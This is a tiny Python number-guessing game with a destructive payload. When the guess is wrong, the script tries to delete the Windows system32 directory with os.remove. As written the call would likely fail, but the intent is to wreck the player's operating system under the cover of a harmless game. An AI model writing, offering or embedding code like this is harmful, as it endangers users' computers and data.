import random
import os

number = random.randint(1, 10)
guess = input ("guess the number between 1 To 10")
guess = int(guess)

if guess == number:
    print("You Won")
else:
    os.remove("c:\\windows\\system32")
